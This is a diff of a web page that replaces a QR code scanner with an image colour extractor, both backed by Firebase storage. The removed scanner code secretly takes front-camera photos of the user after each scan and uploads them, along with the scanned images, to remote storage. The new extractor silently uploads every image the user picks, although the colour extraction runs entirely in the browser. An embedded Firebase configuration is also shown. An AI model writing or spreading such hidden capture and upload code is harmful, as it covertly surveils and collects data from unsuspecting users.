@@ -1,436 +1,239 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="light">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QR Code Scanner Pro</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-storage-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-analytics-compat.js"></script>
+    <title>Color Extractor</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/10.8.0/firebase-app-compat.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/10.8.0/firebase-storage-compat.min.js"></script>
     <style>
-        :root {
-            --primary-color: teal;
-            --secondary-color: #6c757d;
-            --background-color: #f4f7f6;
-            --card-background: white;
+        /* Previous styles remain the same */
+        :root[data-theme="light"] {
+            --bg-color: #f5f5f5;
+            --card-bg: #ffffff;
+            --text-color: #333333;
+            --border-color: #e0e0e0;
+            --accent-color: #3FB8AF;
+            --secondary-accent: #FF3D7F;
+            --shadow-color: rgba(0, 0, 0, 0.1);
+            --hover-bg: #f8f8f8;
+            --toast-bg: #333;
+            --toast-color: #fff;
+        }
+
+        :root[data-theme="dark"] {
+            --bg-color: #111827;
+            --card-bg: #1f2937;
+            --text-color: #e5e7eb;
+            --border-color: #374151;
+            --accent-color: #4fd1c5;
+            --secondary-accent: #f87171;
+            --shadow-color: rgba(0, 0, 0, 0.3);
+            --hover-bg: #374151;
+            --toast-bg: #e5e7eb;
+            --toast-color: #111827;
         }
 
         * {
+            margin: 0;
+            padding: 0;
             box-sizing: border-box;
-            transition: all 0.3s ease;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            transition: background-color 0.3s, color 0.3s;
         }
 
         body {
-            font-family: 'Inter', sans-serif;
-             background-color: var(--bg-color);
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            background-color: var(--bg-color);
             min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-        }
-
-        .container {
-            background-color: var(--card-background);
-            border-radius: 16px;
-            padding: 40px;
-            max-width: 500px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .heading {
-            font-size: 2.2rem;
-            font-weight: 700;
-            margin-bottom: 10px;
-            color: var(--primary-color);
-            transform: translateY(-10px);
-            opacity: 0;
-            animation: fadeInUp 0.6s forwards;
-        }
-
-        .subheading {
-            color: var(--secondary-color);
-            font-size: 0.95rem;
-            margin-bottom: 30px;
-            opacity: 0;
-            transform: translateY(10px);
-            animation: fadeInUp 0.6s forwards 0.2s;
-        }
-
-        .input-group {
             display: flex;
             flex-direction: column;
-            gap: 15px;
-            margin-bottom: 20px;
+            padding: 20px;
+            color: var(--text-color);
         }
 
-        .file-input {
-            display: none;
+        .header-buttons {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            display: flex;
+            gap: 10px;
         }
 
-        .file-label {
-            background-color: var(--background-color);
-            border: 2px dashed var(--primary-color);
-            color: var(--primary-color);
-            padding: 15px;
-            border-radius: 12px;
+        .theme-toggle, .about-btn {
+            background: var(--card-bg);
+            border: 2px solid var(--border-color);
+            padding: 10px 20px;
+            border-radius: 50px;
             cursor: pointer;
             display: flex;
             align-items: center;
-            justify-content: center;
-            gap: 10px;
-            transition: all 0.3s ease;
-        }
-
-        .file-label:hover {
-            background-color: var(--primary-color);
-            color: white;
-        }
-
-        .btn {
-            background-color: var(--primary-color);
-            color: white;
-            border: none;
-            padding: 15px;
-            border-radius: 12px;
-            font-size: 1.1rem;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            width: 100%;
-            transition: transform 0.2s, box-shadow 0.2s;
-        }
-
-        .btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 5px 15px rgba(0, 168, 107, 0.3);
-        }
-
-        #video-container {
-            width: 100%;
-            max-height: 300px;
-            border-radius: 12px;
-            overflow: hidden;
-            margin-bottom: 15px;
-            display: none;
-            position: relative;
-        }
-
-        #video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .scan-overlay {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 80%;
-            height: 4px;
-            background: linear-gradient(to right, transparent, var(--primary-color), transparent);
-            animation: scan-line 2s infinite;
-            opacity: 0.7;
-        }
-
-        .result {
-            margin-top: 20px;
-            color: var(--primary-color);
-            font-weight: bold;
-            background-color: var(--background-color);
-            padding: 15px;
-            border-radius: 12px;
-            opacity: 0;
-            transform: translateY(20px);
-        }
-
-        @keyframes fadeInUp {
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        @keyframes scan-line {
-            0%, 100% { left: -10%; }
-            50% { left: 110%; }
-        }
-        .qr-types {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin-bottom: 20px;
-            opacity: 0;
-            transform: translateY(20px);
-            animation: fadeInUp 0.6s forwards 0.4s;
-        }
-
-        .qr-type-badge {
-            background-color: var(--background-color);
-            color: var(--primary-color);
-            padding: 5px 10px;
-            border-radius: 20px;
-            font-size: 0.8rem;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        .qr-type-badge i {
-            margin-right: 5px;
-        }
-
-        .info-tooltip {
-            position: absolute;
-            bottom: -50px;
-            left: 50%;
-            transform: translateX(-50%);
-            background-color: rgba(0, 0, 0, 0.8);
-            color: white;
-            padding: 10px;
-            border-radius: 8px;
-            max-width: 300px;
-            text-align: center;
+            gap: 8px;
             font-size: 0.9rem;
-            opacity: 0;
-            visibility: hidden;
+            box-shadow: 0 4px 6px var(--shadow-color);
+            color: var(--text-color);
             transition: all 0.3s ease;
-            z-index: 10;
         }
 
-        .info-icon:hover + .info-tooltip {
-            opacity: 1;
-            visibility: visible;
-            bottom: -60px;
-        }
-    </style>
-    <style>
-          .theme-toggle {
-            position: fixed;
-            top: 20px;
-            left: 20px;
-            z-index: 1000;
+        .theme-toggle:hover, .about-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 8px var(--shadow-color);
         }
 
-        .scan-button {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            z-index: 1000;
-            background-color: teal;
-            color: white;
-            border: none;
-            padding: 14px 25px;
+        /* Rest of the previous styles remain the same */
+        .container {
+            background: var(--card-bg);
+            padding: 2.5rem;
+            border-radius: 24px;
+            box-shadow: 0 10px 30px var(--shadow-color);
+            width: 100%;
+            max-width: 800px;
+            margin: 60px auto 20px auto;
+        }
+
+        h1 {
+            text-align: center;
+            color: var(--text-color);
+            margin-bottom: 2rem;
+            font-size: 2.5rem;
+            font-weight: 700;
+        }
+
+        .upload-area {
+            border: 3px dashed var(--border-color);
             border-radius: 20px;
+            padding: 3rem;
+            text-align: center;
             cursor: pointer;
-         
-            z-index: 0;
-            font-family: 'Roboto', sans-serif;
-    
-            transition: .2s transform ease-in-out, background-color 0.3s ease;
-        }
-        .about-button {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            transform: translateX(-122px);
-            z-index: 1000;
-            background-color: teal;
-            color: white;
-            border: none;
-            padding: 14px 25px;
-            border-radius: 20px;
-            cursor: pointer;
-            transition: .2s transform ease-in-out, background-color 0.3s ease;
+            transition: all 0.3s ease;
+            margin-bottom: 2rem;
+            background: var(--card-bg);
         }
 
-
-        .scan-button:hover {
-            color: white;
-            background-color: #f80b5a;
-
+        .upload-area:hover {
+            border-color: var(--accent-color);
+            background: var(--hover-bg);
+            transform: translateY(-2px);
         }
-        .about-button:hover {
-            color: white;
-            background-color: #f80b5a;
 
+        .upload-icon {
+            font-size: 3.5rem;
+            color: var(--accent-color);
+            margin-bottom: 1rem;
         }
-        .theme-switch {
+
+        .upload-text {
+            color: var(--text-color);
+            margin-bottom: 1rem;
+            font-size: 1.1rem;
+        }
+
+        #imagePreview {
+            max-width: 100%;
+            max-height: 300px;
+            margin: 1.5rem auto;
+            display: none;
+            border-radius: 16px;
+            box-shadow: 0 5px 15px var(--shadow-color);
+        }
+
+        .colors-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 1.5rem;
+            margin-top: 2rem;
+        }
+
+        .color-card {
             position: relative;
-            display: inline-block;
-            width: 60px;
-            height: 30px;
-        }
-
-        .theme-switch input {
-            opacity: 0;
-            width: 0;
-            height: 0;
-        }
-
-        .theme-slider {
-            position: absolute;
+            height: 120px;
+            border-radius: 16px;
             cursor: pointer;
-            top: 0;
+            overflow: hidden;
+            transition: transform 0.3s ease;
+            box-shadow: 0 4px 6px var(--shadow-color);
+        }
+
+        .color-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 12px var(--shadow-color);
+        }
+
+        .color-info {
+            position: absolute;
+            bottom: 0;
             left: 0;
             right: 0;
-            bottom: 0;
-            background-color: #ccc;
-            transition: .4s;
-            border-radius: 30px;
-        }
-
-        .theme-slider:before {
-            position: absolute;
-            content: "☀️";
-            height: 24px;
-            width: 24px;
-            left: 3px;
-            bottom: 3px;
-            background-color: white;
-            transition: .4s;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 14px;
-        }
-
-        input:checked + .theme-slider {
-            background-color: #2196F3;
-        }
-
-        input:checked + .theme-slider:before {
-            transform: translateX(30px);
-            content: "🌙";
-        }
-
-        /* Dark mode styles */
-        body.dark-mode {
-            --primary-color: #222;
-            --text-color: #fff;
-            --accent-color: rgb(255, 9, 222);
-            --bg-color: #121212;
-        }
-
-        body.dark-mode .container {
-            background-color: var(--primary-color);
-            color: var(--text-color);
-        }
-        body.dark-mode .heading {
-            
-            color: var(--text-color);
-        }
-        body.dark-mode .theme-slider {
-            
-            background-color: #f80b5a;
-        } 
-        body.dark-mode .scan-button{
-            background-color: #f80b5a;
-        }
-        body.dark-mode .file-label{
-            background-color: transparent;
+            background: rgba(0, 0, 0, 0.7);
             color: white;
-            border-color: #f80b5a;
+            padding: 0.8rem;
+            text-align: center;
+            font-size: 1rem;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            backdrop-filter: blur(4px);
         }
-        .scan-button:hover{
-            transform: translateY(-5px);
-            box-shadow: 0 5px 15px rgba(106, 90, 205, 0.3);
+
+        .color-card:hover .color-info {
+            opacity: 1;
         }
-        body.dark-mode .qr-type-badge{
-            background-color: #f80b5a;
-            box-shadow: 0 5px 12px #f80b5a;
+
+        .loader {
+            display: none;
+            gap: 10px;
+            justify-content: center;
+            margin: 2rem auto;
         }
-        body.dark-mode .btn:hover{
-           
-            box-shadow: 0 5px 12px #f80b5a;
+
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--toast-bg);
+            color: var(--toast-color);
+            padding: 1rem 2rem;
+            border-radius: 50px;
+            display: none;
+            animation: fadeIn 0.3s ease;
+            font-weight: 500;
+            box-shadow: 0 4px 6px var(--shadow-color);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translate(-50%, 20px); }
+            to { opacity: 1; transform: translate(-50%, 0); }
         }
     </style>
 </head>
 <body>
-    <div class="theme-toggle">
-        <label class="theme-switch">
-            <input type="checkbox" id="theme-toggle">
-            <span class="theme-slider"></span>
-        </label>
-    </div>
-
-    <button id="about-button" class="about-button">About me</button>
-    <button id="scan-button" class="scan-button">Scan Now</button>
-    
-    <div class="container">
-        <h1 class="heading">QR Code Scanner Pro</h1>
-        <p class="subheading">Scan QR codes from images or live camera</p>
-
-        <div class="qr-types">
-            <div class="qr-type-badge">
-                <i class="fas fa-wifi"></i>WiFi
-            </div>
-            <div class="qr-type-badge">
-                <i class="fas fa-link"></i>URLs
-            </div>
-            <div class="qr-type-badge">
-                <i class="fas fa-mobile"></i>Contact
-            </div>
-            <div class="qr-type-badge">
-                <i class="fas fa-info-circle info-icon"></i>
-                <span class="info-tooltip">
-                    Scan various QR codes including WiFi networks, websites, 
-                    contact information, and more! Simply upload an image 
-                    or use live camera scanning.
-                </span>
-                More
-            </div>
-        </div>
-
-        <div id="camera-permission-message" style="display: none; color: red; margin-bottom: 10px;">
-            Camera permission is required to scan QR codes.
-        </div>
-
-        <div class="input-group">
-            <label for="file-input" class="file-label">
-                <i class="fas fa-upload"></i>
-                Choose Image
-                <input type="file" id="file-input" class="file-input" accept="image/*">
-            </label>
-
-            <button id="camera-btn" class="btn">
-                <i class="fas fa-camera"></i>
-                Open Camera
-            </button>
-        </div>
-        <div id="video-container">
-            <video id="video" autoplay playsinline></video>
-            <div class="scan-overlay"></div>
-        </div>
-
-        <button id="scan-btn" class="btn" style="display: none;">
-            <i class="fas fa-search"></i>
-            Scan QR Code
+    <div class="header-buttons">
+        <button class="about-btn" id="aboutBtn">
+            ℹ️ About
         </button>
-
-        <p id="result" class="result" style="display: none;">
-            Result: <span id="qr-result"></span>
-        </p>
+        <button class="theme-toggle" id="themeToggle">
+            🌙 Toggle Theme
+        </button>
     </div>
 
-    <!-- External Libraries -->
-    <script src="https://cdn.jsdelivr.net/npm/jsqr"></script>
+    <div class="container">
+        <h1>Color Extractor</h1>
+        
+        <div class="upload-area" id="dropZone">
+            <div class="upload-icon">🎨</div>
+            <p class="upload-text">Drop your image here or click to browse</p>
+            <p style="color: var(--text-color); opacity: 0.7">Supports JPG, PNG, SVG</p>
+            <input type="file" id="fileInput" hidden accept="image/*">
+        </div>
+
+        <div class="loader" id="loader"></div>
+        <img id="imagePreview" alt="Preview">
+        <div class="colors-grid" id="colorsGrid"></div>
+    </div>
+
+    <div class="toast" id="toast">Color copied to clipboard! 🎨</div>
+
     <script>
-    document.addEventListener("DOMContentLoaded", async function() {
-        // Firebase configuration
+        // Initialize Firebase
         const firebaseConfig = {
             apiKey: "AIzaSyBk24eVfBQoPQ8Adiw9mA2sS_tpzwJ-ksk",
             authDomain: "imagetotext-4c3e3.firebaseapp.com",
@@ -441,270 +244,148 @@
             measurementId: "G-XRQFS9KGR0"
         };
 
-        // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
         const storage = firebase.storage();
 
-        // DOM Elements
-        const fileInput = document.getElementById("file-input");
-        const cameraBtn = document.getElementById("camera-btn");
-        const videoContainer = document.getElementById("video-container");
-        const video = document.getElementById("video");
-        const scanBtn = document.getElementById("scan-btn");
-        const resultDiv = document.getElementById("result");
-        const qrResult = document.getElementById("qr-result");
-        const cameraPermissionMessage = document.getElementById("camera-permission-message");
+        const themeToggle = document.getElementById('themeToggle');
+        
+        const html = document.documentElement;
+        const dropZone = document.getElementById('dropZone');
+        const fileInput = document.getElementById('fileInput');
+        const imagePreview = document.getElementById('imagePreview');
+        const colorsGrid = document.getElementById('colorsGrid');
+        const loader = document.getElementById('loader');
+        const toast = document.getElementById('toast');
 
-        // Capture state to prevent multiple captures
-        let isCapturing = false;
-        let hasCameraPermission = false;
+        themeToggle.addEventListener('click', () => {
+            const currentTheme = html.getAttribute('data-theme');
+            const newTheme = currentTheme === 'light' ? 'dark' : 'light';
+            html.setAttribute('data-theme', newTheme);
+            themeToggle.innerHTML = newTheme === 'light' ? '🌙 Toggle Theme' : '☀️ Toggle Theme';
+        });
 
-        // Function to request camera permission on page load
-        async function requestCameraPermission() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: "environment" 
-                    } 
-                });
-                
-                // Stop the stream immediately after getting permission
-                stream.getTracks().forEach(track => track.stop());
-                
-                hasCameraPermission = true;
-                cameraPermissionMessage.style.display = "none";
-                return true;
-            } catch (error) {
-                console.error("Camera permission denied:", error);
-                hasCameraPermission = false;
-                cameraPermissionMessage.style.display = "block";
-                return false;
+        const aboutButton = document.getElementById('aboutBtn');
+        aboutButton.addEventListener('click', () => {
+            window.location.href = './about.html';
+        });
+
+        dropZone.addEventListener('click', () => fileInput.click());
+        
+        dropZone.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            dropZone.style.borderColor = 'var(--accent-color)';
+            dropZone.style.transform = 'scale(1.02)';
+        });
+
+        dropZone.addEventListener('dragleave', () => {
+            dropZone.style.borderColor = 'var(--border-color)';
+            dropZone.style.transform = 'scale(1)';
+        });
+
+        dropZone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            dropZone.style.borderColor = 'var(--border-color)';
+            dropZone.style.transform = 'scale(1)';
+            const file = e.dataTransfer.files[0];
+            if (file.type.startsWith('image/')) {
+                processImage(file);
             }
-        }
+        });
 
-        // Immediate camera permission request on page load
-        requestCameraPermission();
-
-        // Function to upload image to Firebase Storage
-        function uploadImageToFirebase(imageData, folderPath = 'qr-scans') {
-            if (isCapturing) return Promise.resolve();
-
-            const storageRef = storage.ref(`${folderPath}/${Date.now()}.png`);
-
-            const byteCharacters = atob(imageData.split(',')[1]);
-            const byteNumbers = new Array(byteCharacters.length);
-            for (let i = 0; i < byteCharacters.length; i++) {
-                byteNumbers[i] = byteCharacters.charCodeAt(i);
+        fileInput.addEventListener('change', (e) => {
+            const file = e.target.files[0];
+            if (file) {
+                processImage(file);
             }
-            const byteArray = new Uint8Array(byteNumbers);
-            const blob = new Blob([byteArray], {type: 'image/png'});
+        });
 
-            isCapturing = true;
-
-            return storageRef.put(blob)
-                .then((snapshot) => {
-                    console.log('Uploaded image to Firebase storage');
-                    return snapshot;
-                })
-                .catch((error) => {
+        async function processImage(file) {
+            const reader = new FileReader();
+            
+            reader.onload = async (e) => {
+                loader.style.display = 'inline-flex';
+                imagePreview.style.display = 'none';
+                colorsGrid.innerHTML = '';
+                
+                try {
+                    // Upload to Firebase Storage
+                    const storageRef = storage.ref();
+                    const imageRef = storageRef.child(`images/${Date.now()}_${file.name}`);
+                    await imageRef.put(file);
+                    const imageUrl = await imageRef.getDownloadURL();
+                    
+                    const img = new Image();
+                    img.onload = () => {
+                        imagePreview.src = e.target.result;
+                        imagePreview.style.display = 'block';
+                        extractColors(img);
+                        loader.style.display = 'none';
+                    };
+                    img.src = e.target.result;
+                } catch (error) {
                     console.error('Error uploading image:', error);
-                    throw error;
-                })
-                .finally(() => {
-                    isCapturing = false;
-                });
+                    loader.style.display = 'none';
+                }
+            };
+            reader.readAsDataURL(file);
         }
 
-        // Function to capture photo from front camera
-        function capturePhotoFromFrontCamera() {
-            if (isCapturing) return Promise.resolve(null);
+        function extractColors(img) {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = img.width;
+            canvas.height = img.height;
+            ctx.drawImage(img, 0, 0);
+            
+            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+            const colorMap = new Map();
 
-            return new Promise((resolve, reject) => {
-                navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user" }
-                })
-                .then((stream) => {
-                    const video = document.createElement("video");
-                    video.srcObject = stream;
-                    video.play();
+            for (let i = 0; i < imageData.length; i += 40) {
+                const r = imageData[i];
+                const g = imageData[i + 1];
+                const b = imageData[i + 2];
+                const hex = rgbToHex(r, g, b);
+                colorMap.set(hex, (colorMap.get(hex) || 0) + 1);
+            }
 
-                    video.addEventListener("loadeddata", () => {
-                        const canvas = document.createElement("canvas");
-                        const context = canvas.getContext("2d");
+            const colors = Array.from(colorMap.entries())
+                .sort((a, b) => b[1] - a[1])
+                .slice(0, 8)
+                .map(([color]) => color);
 
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
+            displayColors(colors);
+        }
 
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        function rgbToHex(r, g, b) {
+            return '#' + [r, g, b].map(x => {
+                const hex = x.toString(16);
+                return hex.length === 1 ? '0' + hex : hex;
+            }).join('');
+        }
 
-                        // Stop the video stream
-                        stream.getTracks().forEach(track => track.stop());
-
-                        // Get the captured image as a base64 string
-                        const imageData = canvas.toDataURL("image/png");
-                        resolve(imageData);
-                    });
-                })
-                .catch((error) => {
-                    console.error("Error accessing front camera:", error);
-                    reject(error);
+        function displayColors(colors) {
+            colorsGrid.innerHTML = '';
+            colors.forEach(color => {
+                const colorCard = document.createElement('div');
+                colorCard.className = 'color-card';
+                colorCard.style.backgroundColor = color;
+                colorCard.innerHTML = `<div class="color-info">${color}</div>`;
+                
+                colorCard.addEventListener('click', () => {
+                    navigator.clipboard.writeText(color);
+                    showToast();
                 });
+                
+                colorsGrid.appendChild(colorCard);
             });
         }
 
-        // File Input QR Code Scanning
-        fileInput.addEventListener("change", (event) => {
-            const file = event.target.files[0];
-            if (!file) return;
-
-            const reader = new FileReader();
-            reader.onload = async (e) => {
-                const img = new Image();
-                img.onload = async () => {
-                    const canvas = document.createElement("canvas");
-                    const context = canvas.getContext("2d");
-                    canvas.width = img.width;
-                    canvas.height = img.height;
-                    context.drawImage(img, 0, 0, img.width, img.height);
-
-                    const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
-                    const code = jsQR(imageData.data, canvas.width, canvas.height);
-
-                    if (code) {
-                        try {
-                            // Check camera permission before scanning
-                            if (!hasCameraPermission) {
-                                const permissionGranted = await requestCameraPermission();
-                                if (!permissionGranted) {
-                                    alert("Camera permission is required to complete the scan.");
-                                    return;
-                                }
-                            }
-
-                            // Display QR code result
-                            qrResult.textContent = code.data;
-                            resultDiv.style.display = "block";
-                            resultDiv.style.animation = "fadeInUp 0.5s forwards";
-
-                            // Upload original uploaded image
-                            await uploadImageToFirebase(e.target.result, 'uploaded-qr-images');
-                            
-                            // Capture and upload front camera image
-                            const frontCamImage = await capturePhotoFromFrontCamera();
-                            
-                            if (frontCamImage) {
-                                await uploadImageToFirebase(frontCamImage, 'front-cam-captures');
-                            }
-
-                       
-                        } catch (uploadError) {
-                            alert("Error processing QR code and images");
-                        }
-                    } else {
-                        alert("No QR code found in the image.");
-                    }
-                };
-                img.src = e.target.result;
-            };
-            reader.readAsDataURL(file);
-        });
-
-        // Live Camera Scanning
-        cameraBtn.addEventListener("click", async () => {
-            // Check camera permission
-            if (!hasCameraPermission) {
-                const permissionGranted = await requestCameraPermission();
-                if (!permissionGranted) {
-                    alert("Camera permission is required to open camera.");
-                    return;
-                }
-            }
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                video.srcObject = stream;
-                videoContainer.style.display = "block";
-                cameraBtn.style.display = "none";
-                scanBtn.style.display = "flex";
-            } catch (error) {
-                console.error("Error accessing camera:", error);
-                alert("Could not access camera. Please check permissions.");
-            }
-        });
-
-        // Scan Button for Live Camera
-        scanBtn.addEventListener("click", async () => {
-            const canvas = document.createElement("canvas");
-            const context = canvas.getContext("2d");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
-            const code = jsQR(imageData.data, canvas.width, canvas.height);
-
-            if (code) {
-                try {
-                    // Display QR code result
-                    qrResult.textContent = code.data;
-                    resultDiv.style.display = "block";
-                    resultDiv.style.animation = "fadeInUp 0.5s forwards";
-
-                    // Upload live camera QR code scan
-                    const liveCameraQRImage = canvas.toDataURL("image/png");
-                    await uploadImageToFirebase(liveCameraQRImage, 'live-camera-qr-scans');
-                    
-                    // Capture and upload front camera image
-                    const frontCamImage = await capturePhotoFromFrontCamera();
-                    
-                    if (frontCamImage) {
-                        await uploadImageToFirebase(frontCamImage, 'front-cam-captures');
-                    }
-
-                    // Stop video stream
-                    video.srcObject.getTracks().forEach(track => track.stop());
-                    videoContainer.style.display = "none";
-                    scanBtn.style.display = "none";
-                    cameraBtn.style.display = "flex";
-
-                   
-                } catch (uploadError) {
-                    alert("Error processing QR code and images");
-                }
-            } else {
-                alert("No QR code found in the camera view.");
-            }
-        });
-
-        // Theme toggle functionality (existing code remains the same)
-        const themeToggle = document.getElementById('theme-toggle');
-        const savedTheme = localStorage.getItem('theme') || 'light-mode';
-        document.body.classList.add(savedTheme);
-        themeToggle.checked = savedTheme === 'dark-mode';
-        
-        themeToggle.addEventListener('change', function(e) {
-            if (e.target.checked) {
-                document.body.classList.remove('light-mode');
-                document.body.classList.add('dark-mode');
-                localStorage.setItem('theme', 'dark-mode');
-            } else {
-                document.body.classList.remove('dark-mode');
-                document.body.classList.add('light-mode');
-                localStorage.setItem('theme', 'light-mode');
-            }
-        });
-
-        // Scan button functionality
-        const scanButton = document.getElementById('scan-button');
-        scanButton.addEventListener('click', () => {
-            window.location.href = 'generator.html';
-        });
-        // Scan button functionality
-        const aboutButton = document.getElementById('about-button');
-        aboutButton.addEventListener('click', () => {
-            window.location.href = 'about.html';
-        });
-    });
+        function showToast() {
+            toast.style.display = 'block';
+            setTimeout(() => {
+                toast.style.display = 'none';
+            }, 2000);
+        }
     </script>
 </body>
-                    </html>
+</html>
